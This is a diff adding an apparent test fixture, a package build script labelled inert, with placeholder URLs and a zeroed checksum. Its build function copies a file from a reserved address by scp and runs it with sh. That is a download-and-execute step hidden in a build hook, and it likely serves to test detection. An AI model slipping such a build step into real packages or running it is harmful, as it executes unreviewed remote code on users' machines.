@@ -1,0 +1,13 @@
+# Inert test fixture: nothing here is ever run, and every address is reserved or fake.
+pkgname=scp-run
+pkgver=1.0
+pkgrel=1
+arch=(x86_64)
+url=https://example.org
+license=(MIT)
+source=(https://example.org/demo.tar.gz)
+sha256sums=(0000000000000000000000000000000000000000000000000000000000000000)
+build() {
+  scp mirror@198.51.100.60:y .
+  sh y
+}
